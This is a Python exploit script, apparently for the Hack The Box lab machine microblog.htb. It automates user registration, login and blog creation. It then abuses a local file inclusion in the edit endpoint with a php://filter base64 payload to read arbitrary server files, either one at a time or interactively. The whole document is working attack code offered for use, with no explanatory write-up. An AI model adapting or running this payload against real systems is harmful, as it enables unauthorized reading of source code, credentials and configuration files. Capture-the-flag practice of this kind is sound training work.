#!/usr/bin/env python3
from argparse import ArgumentParser
from requests import post, Session, exceptions
from base64 import b64decode
from string import ascii_lowercase
from random import choice

POST_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

def getRandomText(length: int):
    return "".join(choice(ascii_lowercase) for i in range(length))

def registerUser() -> dict:
    username = getRandomText(9)
    password = getRandomText(9)
    user = {"first-name": username, "last-name": username, "username": username, "password": password}

    try:
        post("http://app.microblog.htb/register/index.php", headers=POST_HEADERS, data=user, timeout=2)
    except exceptions.ReadTimeout:
        print("[ERROR] The register request timed out")
        exit(1)
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to register a user")
        exit(1)
    return user

def loginUser(user: dict) -> Session:
    session = Session()
    try:
        session.post("http://app.microblog.htb/login/index.php", headers=POST_HEADERS, data=user, timeout=2)
    except exceptions.ReadTimeout:
        print("[ERROR] The login request timed out")
        exit(1)
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to login")
        exit(1)
    return session

def createBlog(session: Session) -> str:
    blogNameSize = 8
    blogName = getRandomText(blogNameSize)
    blog = {"new-blog-name": blogName}

    try:
        session.post("http://app.microblog.htb/dashboard/index.php", headers=POST_HEADERS, data=blog, timeout=2)
    except exceptions.ReadTimeout:
        print("[ERROR] The request creating a blog timed out")
        exit(1)
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to create a blog")
        exit(1)
    return blogName

def getArguments():
    parser = ArgumentParser(description="Local File Inclusion exploit for microblog.htb")
    parser.add_argument("-f", "--file", required=False, help="The file to read")
    return parser.parse_args()

def parseFileInHTML(html: str) -> str:
    b64fileStart = html.split("convert.base64-encode")[-1].split('>', 1)[1]
    b64file = b64fileStart.split('<', 1)[0]
    fileContent = b64decode(b64file)
    return fileContent.decode("utf-8")

def readFile(session: Session, blogName: str, filepath: str) -> str:
    host = f"{blogName}.microblog.htb"
    headers = {"Host": host}
    headers.update(POST_HEADERS)
    payload = {"id": f"php://filter/convert.base64-encode/resource={filepath}", "txt": ""}

    try:
        response = session.post("http://app.microblog.htb/edit/index.php", headers=headers, data=payload, allow_redirects=False, timeout=4)
    except exceptions.ReadTimeout:
        print("[ERROR] The request adding the file to the blog timed out")
        return
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to add the file to the blog")
        return
    html = response.text
    fileContent = parseFileInHTML(html)
    return fileContent
    

def startInteractiveRead(session: Session, blogName: str):
    print("Press Ctrl+C to exit")
    while True:
        file = input("File to read:\n> ")
        content = readFile(session, blogName, file)
        print(content)

def main():
    args = getArguments()
    user = registerUser()
    session = loginUser(user)
    blogName = createBlog(session)

    if args.file != None:
        content = readFile(session, blogName, args.file)
        print(content)
    else:
        try:
            startInteractiveRead(session, blogName)
        except KeyboardInterrupt:
            print("Quitting..\n")

if __name__ == "__main__":
    main()
